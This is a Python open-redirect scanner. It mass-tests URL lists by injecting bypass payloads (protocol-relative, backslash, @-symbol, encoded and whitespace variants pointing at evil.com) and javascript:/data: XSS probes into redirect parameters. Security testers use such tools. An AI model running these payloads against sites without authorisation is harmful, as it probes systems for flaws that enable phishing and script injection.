#!/usr/bin/env python3
"""
Open Redirect Vulnerability Tester
Tests URLs for open redirect vulnerabilities using various payloads
"""

import requests
import argparse
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Color codes
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

# Thread-safe printing
print_lock = Lock()

# Test payloads - multiple techniques
PAYLOADS = [
    # External domain redirects
    'https://evil.com',
    'http://evil.com',
    '//evil.com',
    '///evil.com',
    '////evil.com',
    'https://evil.com/',
    'https:evil.com',

    # Protocol-relative
    '//google.com',
    '///google.com',

    # Special characters and bypasses
    'https://evil.com%00',
    'https://evil.com%0d%0a',
    'https://evil.com%23',
    'https://evil.com%3f',

    # Backslash variations
    'https://evil.com\\',
    'https:\\evil.com',
    'https:/\\/evil.com',

    # @ symbol bypasses
    'https://legitimate.com@evil.com',
    'https://evil.com%40legitimate.com',

    # Dot variations
    'https://evil.com.',
    'https://evil。com',

    # Unicode/IDN bypasses
    'https://evil。com',
    'https://evil%E3%80%82com',

    # JavaScript protocol
    'javascript:alert(document.domain)',
    'javascript:alert(1)',
    'javascript://evil.com%0Aalert(1)',

    # Data URIs
    'data:text/html,<script>alert(document.domain)</script>',

    # Whitespace bypasses
    'https://evil.com%20',
    'https://evil.com\t',
    'https://evil.com\n',
    ' https://evil.com',

    # Encoding bypasses
    'https%3A%2F%2Fevil.com',
    'https%3a%2f%2fevil.com',

    # Open Redirect common test domains
    'https://redirect-test.com',
    'http://burpcollaborator.net',
]

# Parameters commonly used for redirects
REDIRECT_PARAMS = [
    'url', 'redirect', 'redir', 'return', 'next', 'destination', 'dest',
    'continue', 'view', 'target', 'to', 'out', 'link', 'site', 'location',
    'domain', 'reference', 'ref', 'path', 'window', 'uri', 'forward',
    'forwardurl', 'goto', 'go', 'ReturnUrl', 'redirect_url', 'redirect_uri',
    'redirectUrl', 'redirectUri', 'return_url', 'returnUrl', 'next_url',
    'nextUrl', 'callback', 'callback_url', 'callbackUrl', 'continue_url',
    'continueUrl', 'success_url', 'successUrl'
]

def safe_print(message):
    """Thread-safe printing"""
    with print_lock:
        print(message)

def is_open_redirect(original_url, test_url, response, payload):
    """
    Check if the response indicates an open redirect vulnerability
    """
    # Check status codes that indicate redirects
    if response.status_code in [301, 302, 303, 307, 308]:
        location = response.headers.get('Location', '')

        # Check if location header contains our payload
        if any(domain in location.lower() for domain in ['evil.com', 'google.com', 'redirect-test.com']):
            return True, f"Redirect to external domain: {location}"

        # Check for protocol-relative redirects
        if location.startswith('//') and 'evil.com' in location:
            return True, f"Protocol-relative redirect: {location}"

    # Check response body for meta refresh or JavaScript redirects
    if response.status_code == 200:
        content = response.text.lower()

        # Meta refresh check
        meta_refresh = re.search(r'<meta[^>]*http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url=([^"\']+)', content, re.IGNORECASE)
        if meta_refresh:
            redirect_url = meta_refresh.group(1)
            if any(domain in redirect_url for domain in ['evil.com', 'google.com', 'redirect-test.com']):
                return True, f"Meta refresh redirect: {redirect_url}"

        # JavaScript redirect check
        js_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
            r'document\.location\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
        ]

        for pattern in js_patterns:
            js_redirect = re.search(pattern, content, re.IGNORECASE)
            if js_redirect:
                redirect_url = js_redirect.group(1)
                if any(domain in redirect_url for domain in ['evil.com', 'google.com', 'redirect-test.com']):
                    return True, f"JavaScript redirect: {redirect_url}"

    return False, None

def test_url(url, timeout=10):
    """
    Test a single URL for open redirect vulnerabilities
    """
    results = []

    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Find redirect parameters
        redirect_params_found = [p for p in params.keys() if p.lower() in [rp.lower() for rp in REDIRECT_PARAMS]]

        if not redirect_params_found:
            # Try to identify potential redirect params
            redirect_params_found = [p for p in params.keys()]

        # Test each redirect parameter found
        for param in redirect_params_found:
            for payload in PAYLOADS:
                try:
                    # Create new URL with payload
                    new_params = params.copy()
                    new_params[param] = [payload]

                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment
                    ))

                    # Make request with redirects disabled
                    response = requests.get(
                        test_url,
                        allow_redirects=False,
                        timeout=timeout,
                        verify=False,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )

                    # Check if vulnerable
                    is_vuln, reason = is_open_redirect(url, test_url, response, payload)

                    if is_vuln:
                        result = {
                            'url': test_url,
                            'original': url,
                            'parameter': param,
                            'payload': payload,
                            'reason': reason,
                            'status': response.status_code
                        }
                        results.append(result)
                        safe_print(f"{RED}[VULNERABLE]{NC} {test_url}")
                        safe_print(f"  └─ Parameter: {param} | Payload: {payload} | Reason: {reason}")
                        break  # Found vulnerability, no need to test more payloads for this param

                except requests.exceptions.RequestException:
                    # Skip on request errors
                    continue
                except Exception:
                    continue

    except Exception as e:
        pass

    return results

def test_urls_from_file(input_file, output_file, threads=50):
    """
    Test multiple URLs from a file
    """
    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        safe_print(f"{RED}Error: File '{input_file}' not found{NC}")
        sys.exit(1)

    total = len(urls)
    safe_print(f"{BLUE}[*] Testing {total} URLs with {threads} threads...{NC}\n")

    all_results = []
    completed = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(test_url, url): url for url in urls}

        for future in as_completed(future_to_url):
            completed += 1
            url = future_to_url[future]

            try:
                results = future.result()
                if results:
                    all_results.extend(results)

                # Progress indicator
                if completed % 10 == 0 or completed == total:
                    safe_print(f"{YELLOW}[*] Progress: {completed}/{total}{NC}")

            except Exception as e:
                pass

    # Write results to file
    if all_results:
        with open(output_file, 'w') as f:
            f.write("# Open Redirect Vulnerabilities Found\n")
            f.write("# Generated by Open Redirect Scanner\n\n")

            for result in all_results:
                f.write(f"[VULNERABLE] {result['url']}\n")
                f.write(f"  Original URL: {result['original']}\n")
                f.write(f"  Parameter: {result['parameter']}\n")
                f.write(f"  Payload: {result['payload']}\n")
                f.write(f"  Reason: {result['reason']}\n")
                f.write(f"  Status Code: {result['status']}\n")
                f.write("\n")

        safe_print(f"\n{GREEN}[✓] Found {len(all_results)} potential vulnerabilities{NC}")
        safe_print(f"{BLUE}[*] Results saved to: {output_file}{NC}")
    else:
        # Create empty file to indicate scan completed
        with open(output_file, 'w') as f:
            f.write("# No open redirect vulnerabilities found\n")

        safe_print(f"\n{YELLOW}[*] No vulnerabilities found{NC}")

def main():
    parser = argparse.ArgumentParser(
        description='Open Redirect Vulnerability Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-l', '--list', required=True, help='Input file containing URLs')
    parser.add_argument('-o', '--output', required=True, help='Output file for results')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')

    args = parser.parse_args()

    test_urls_from_file(args.list, args.output, args.threads)

if __name__ == '__main__':
    main()
